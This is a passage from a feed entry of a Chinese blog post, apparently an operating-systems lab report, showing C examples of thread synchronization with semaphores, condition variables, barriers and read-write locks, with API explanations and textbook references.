class="line">&#125;</span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">sem_wait(&amp;full);</span><br><span class="line"><span class="keyword">if</span>(full_v != <span class="number">0</span>)&#123;</span><br><span class="line">full_v--;</span><br><span class="line"></span><br><span class="line">sem_wait(&amp;mutex);</span><br><span class="line">buff[out] = NEXTC;</span><br><span class="line">out = (out + <span class="number">1</span>)% <span class="number">5</span>;</span><br><span class="line">print(buff,<span class="number">5</span>);</span><br><span class="line">sem_post(&amp;mutex);</span><br><span class="line"></span><br><span class="line">empty_v++;</span><br><span class="line">sem_post(&amp;empty);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">sem_init(&amp;empty,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">sem_init(&amp;full,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">sem_init(&amp;mutex,<span class="number">0</span>,<span class="number">1</span>);<span class="comment">//创建一个二进制信号量，功能相当于互斥锁</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> tid1,tid2;</span><br><span class="line">pthread_create(&amp;tid1,<span class="literal">NULL</span>,producer,<span class="literal">NULL</span>);</span><br><span class="line">pthread_create(&amp;tid2,<span class="literal">NULL</span>,consumer,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">pthread_join(tid1,<span class="literal">NULL</span>);</span><br><span class="line">pthread_join(tid2,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">sem_destroy(&amp;empty);</span><br><span class="line">sem_destroy(&amp;full);</span><br><span class="line">sem_destroy(&amp;mutex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510143913504.png" alt="未加锁"></p><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510143723815.png" alt="加锁"></p><h3 id="信号量-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#信号量-同步互斥关键代码说明"></a> 信号量 同步互斥关键代码说明</h3><ol><li><p>要使用信号量，先包含头文件&lt;semaphore.h&gt;</p></li><li><p>sem_t：信号量的数据类型，实际上是个长整型，但除P，V操作外不能对它执行加减操作</p></li><li><p>int sem_init(sem_t *sem, int pshared, unsigned int val);</p><blockquote><p>第一个参数为信号量指针，第二个参数为信号量类型（一般设置为0），第三个为信号量初始值。<br>第二个参数pshared为0时，该进程内所有线程可用，不为0时不同进程间可用。</p></blockquote></li><li><p>int sem_wait(sem_t *sem);</p><blockquote><p>申请一个信号量，当前无可用信号量则等待，有可用信号量时占用一个信号量，对信号量的值减1。</p></blockquote></li><li><p>int sem_post(sem_t *sem);</p><blockquote><p>释放一个信号量，信号量的值加1。</p></blockquote></li><li><p>int sem_destory(sem_t *sem);</p><blockquote><p>销毁信号量。</p></blockquote></li></ol><h2 id="条件变量-同步互斥方法实现"><a class="markdownIt-Anchor" href="#条件变量-同步互斥方法实现"></a> 条件变量 同步互斥方法实现</h2><h3 id="条件变量-同步互斥示例代码"><a class="markdownIt-Anchor" href="#条件变量-同步互斥示例代码"></a> 条件变量 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dining_sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">pthread_mutex_t</span> mutex[<span class="number">5</span>] = &#123;</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER,</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER,</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER,</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER,</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">pthread_cond_t</span> conds[<span class="number">5</span>] = &#123;</span><br><span class="line">PTHREAD_COND_INITIALIZER,</span><br><span class="line">PTHREAD_COND_INITIALIZER,</span><br><span class="line">PTHREAD_COND_INITIALIZER,</span><br><span class="line">PTHREAD_COND_INITIALIZER,</span><br><span class="line">PTHREAD_COND_INITIALIZER</span><br><span class="line">&#125;;  <span class="comment">//标识哲学家</span></span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;<span class="comment">//记录正在吃饭的人数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pickup_forks</span><span class="params">(<span class="type">int</span> philosopher_number)</span><span class="comment">//想吃</span></span><br><span class="line">&#123;</span><br><span class="line">pthread_mutex_lock(&amp;mutex[philosopher_number]);</span><br><span class="line"><span class="keyword">while</span>(dining_sum &gt;= <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;正在挨饿。。。 &#123;%u&#125;\n&quot;</span>,pthread_self());</span><br><span class="line">pthread_cond_wait(&amp;conds[philosopher_number],&amp;mutex[philosopher_number]);</span><br><span class="line">&#125;</span><br><span class="line">dining_sum++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;正在吃饭。。。 &#123;%u&#125;\n&quot;</span>,pthread_self());</span><br><span class="line">sleep(<span class="number">0.5</span>);</span><br><span class="line">pthread_mutex_unlock(&amp;mutex[philosopher_number]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">return_forks</span><span class="params">(<span class="type">int</span> philosopher_number)</span><span class="comment">//吃完</span></span><br><span class="line">&#123;</span><br><span class="line">pthread_mutex_lock(&amp;mutex[philosopher_number]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;吃饱了，开始思考问题！ &#123;%u&#125;\n&quot;</span>,pthread_self());</span><br><span class="line">dining_sum--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;思考完了！！&#123;%u&#125;\n&quot;</span>,pthread_self());</span><br><span class="line">pthread_cond_signal (&amp;conds[philosopher_number]);</span><br><span class="line">pthread_mutex_unlock(&amp;mutex[philosopher_number]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">philosophers</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">pickup_forks(*(<span class="type">int</span>*)arg);</span><br><span class="line">return_forks(*(<span class="type">int</span>*)arg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> pid[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">5</span>; k++)</span><br><span class="line">pthread_create(&amp;pid[k], <span class="literal">NULL</span>, philosophers,(<span class="type">void</span>*)&amp;k);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">5</span>; k++)</span><br><span class="line">pthread_join(pid[k],<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510144752297.png" alt="image-20220510144752297"></p><h3 id="条件变量-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#条件变量-同步互斥关键代码说明"></a> 条件变量 同步互斥关键代码说明</h3><ol><li><p>int pthread_cond_init(pthread_cond_t *restrict cond, const pthread_condattr_t *restrict attr);</p><blockquote><p>初始化条件变量，cond 指明其id，attr 指明其属性</p></blockquote></li><li><p>int pthread_cond_destroy(pthread_cond_t *cond);</p><blockquote><p>销毁条件变量</p></blockquote></li><li><p>int pthread_cond_wait(pthread_cond_t *restict cond ,pthread_mutex_t *restrict mutex);</p><blockquote><p>互斥量对此函数进行保护。调用者把锁住的互斥量传给函数，函数然后自动把调用线程放到等待条件的线程列表上，对互斥量解锁，函数返回时，互斥量再次被锁住。</p></blockquote></li><li><p>int pthread_cond_signal(pthread_cond_t *cond);</p><blockquote><p>该函数通知线程条件已满足，至少能够唤醒一个等待该条件的线程</p></blockquote></li></ol><h2 id="屏障-同步互斥方法实现"><a class="markdownIt-Anchor" href="#屏障-同步互斥方法实现"></a> 屏障 同步互斥方法实现</h2><h3 id="屏障-同步互斥示例代码"><a class="markdownIt-Anchor" href="#屏障-同步互斥示例代码"></a> 屏障 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//家庭就餐，要等到所有人入席才能开始吃饭</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DINNERS 3</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_barrier_t</span> barrier;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dinners[DINNERS] = &#123;<span class="string">&quot;爸爸&quot;</span>,<span class="string">&quot;妈妈&quot;</span>,<span class="string">&quot;我&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">person</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = (<span class="type">int</span>)arg;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s入席\n&quot;</span>,dinners[i]);</span><br><span class="line">pthread_barrier_wait(&amp;barrier);</span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">pthread_barrier_init(&amp;barrier,<span class="literal">NULL</span>,DINNERS);</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> pid[DINNERS];</span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; DINNERS; k++)&#123;</span><br><span class="line"><span class="type">int</span> err = pthread_create(&amp;pid[k], <span class="literal">NULL</span>, person,(<span class="type">void</span>*)k);</span><br><span class="line"><span class="keyword">if</span>(err != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程创建失败！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; DINNERS; k++)</span><br><span class="line">pthread_join(pid[k],<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;大家开始吃饭！\n&quot;</span>);</span><br><span class="line">pthread_barrier_destroy(&amp;barrier);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未加锁：警告不用管<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510145758194.png" alt="未加锁"></p><p>加锁：警告不用管<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510145727208.png" alt="加锁"></p><h3 id="屏障-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#屏障-同步互斥关键代码说明"></a> 屏障 同步互斥关键代码说明</h3><ol><li><p>int pthread_barrier_init(pthread_barrier_t *restrict barrier, const pthread_barrierattr_t *restrict attr, unsigned int count);</p><blockquote><p>对屏障初始化，count规定到达屏障线程的数目。</p></blockquote></li><li><p>int pthread_barrier_destroy(pthread_barrier_t *barrier);</p><blockquote><p>销毁屏障，释放其资源</p></blockquote></li><li><p>int pthread_barrier_wait(pthread_barrier_t *barrier);</p><blockquote><p>当代其它线程到达屏障，当线程数量不满足时，已到达的线程会休眠，<br>直到最后一个线程到达屏障，满足屏障计数，所有线程都被唤醒。</p></blockquote></li></ol><h2 id="读写锁-同步互斥方法实现"><a class="markdownIt-Anchor" href="#读写锁-同步互斥方法实现"></a> 读写锁 同步互斥方法实现</h2><h3 id="读写锁-同步互斥示例代码"><a class="markdownIt-Anchor" href="#读写锁-同步互斥示例代码"></a> 读写锁 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_rwlock_t</span> rwlock;</span><br><span class="line"><span class="type">int</span> num = <span class="number">-1</span>;<span class="comment">//共享内存</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">writer</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">pthread_rwlock_wrlock(&amp;rwlock);<span class="comment">//获取写模式的读写锁</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Writing [%d]&quot;</span>,(<span class="type">int</span>*)arg);</span><br><span class="line">num = (<span class="type">int</span>*)arg; <span class="comment">//向共享内存写入数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----:%d\n&quot;</span>,num);</span><br><span class="line">pthread_rwlock_unlock(&amp;rwlock);</span><br><span class="line"></span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">reader</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">pthread_rwlock_rdlock(&amp;rwlock);<span class="comment">//获取读模式的读写锁</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Reading [%d]----:%d\n&quot;</span>,(<span class="type">int</span>*)arg,num);<span class="comment">//读取共享内存</span></span><br><span class="line"></span><br><span class="line">pthread_rwlock_unlock(&amp;rwlock);</span><br><span class="line"></span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">pthread_rwlock_init(&amp;rwlock,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> pid1[<span class="number">5</span>],pid2[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">pthread_create(&amp;pid1[i],<span class="literal">NULL</span>,reader,(<span class="type">void</span>*)i);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">pthread_create(&amp;pid2[i],<span class="literal">NULL</span>,writer,(<span class="type">void</span>*)i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">pthread_join(pid1[i],<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">pthread_join(pid2[i],<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">pthread_rwlock_destroy(&amp;rwlock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510150139457.png" alt="未加锁"></p><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510150032813.png" alt="加锁"></p><h3 id="362-读写锁-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#362-读写锁-同步互斥关键代码说明"></a> 3.6.2 读写锁 同步互斥关键代码说明</h3><ol><li><p>int pthread_rwlock_init(pthread_rwlock_t *restrict rwlock, const pthread_rwlockattr_t *restrict attr);</p><blockquote><p>初始化读写锁</p></blockquote></li><li><p>int pthread_rwlock_destroy(pthread_rwlock_t *rwlock);</p><blockquote><p>销毁读写锁，释放其资源</p></blockquote></li><li><p>int pthread_rwlock_rdlock(pthread_rwlock_t *rwlock);</p><blockquote><p>获取读状态的读写锁，允许多个线程进行读访问</p></blockquote></li><li><p>int pthread_rwlock_wrlock(pthread_rwlock_t *rwlock);</p><blockquote><p>获取写状态的读写锁，只允许一个线程进行写访问</p></blockquote></li><li><p>int pthread_rwlock_unlock(pthread_rwlock_t *rwlock);</p><blockquote><p>解锁，不管是读状态还是写状态，都能用此函数进行解锁</p></blockquote></li></ol><h1 id="实验总结"><a class="markdownIt-Anchor" href="#实验总结"></a> 实验总结</h1><p>光看书不动手是学不到东西的，学中做，做中学。</p><h1 id="参考书籍"><a class="markdownIt-Anchor" href="#参考书籍"></a> 参考书籍</h1><blockquote><ol><li><p>亚伯拉罕·西尔伯沙茨 等 著，郑扣根 译。操作系统概念（原书第9版）。<br>机械工业出版社，ISBN：9787111604365，2018。</p></li><li><p>[美] W.，理查德·史蒂文斯（W.，Richard，Stevens）史蒂芬·A.，拉戈 著，<br>戚正伟，张亚英，尤晋元 译。Unix环境高级编程。<br>人民邮电出版社，ISBN：9787115516756，2019。</p></li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;操作系统同步互斥&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#操作系统同步互斥&quot;&gt;&lt;/a&gt; 《操作系统》同步互斥&lt;/h1&gt;
&lt;h1 id=&quot;引起同步互斥问题的原因&quot;&gt;&lt;a class=&quot;markdownIt-</summary>
      
    
    
    
    <category term="操作系统" scheme="https://www.rgzzplus.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="同步互斥" scheme="https://www.rgzzplus.com/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/"/>
    
    <category term="互斥锁" scheme="https://www.rgzzplus.com/tags/%E4%BA%92%E6%96%A5%E9%94%81/"/>
    
    <category term="自旋锁" scheme="https://www.rgzzplus.com/tags/%E8%87%AA%E6%97%8B%E9%94%81/"/>
    
    <category term="读写锁" scheme="https://www.rgzzplus.com/tags/%E8%AF%BB%E5%86%99%E9%94%81/"/>
    
    <category term="信号量" scheme="https://www.rgzzplus.com/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/"/>
    
    <category term="条件变量" scheme="https://www.rgzzplus.com/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/"/>
    
    <category term="屏障" scheme="https://www.rgzzplus.com/tags/%E5%B1%8F%E9%9A%9C/"/>
    
  </entry>
  
</feed>
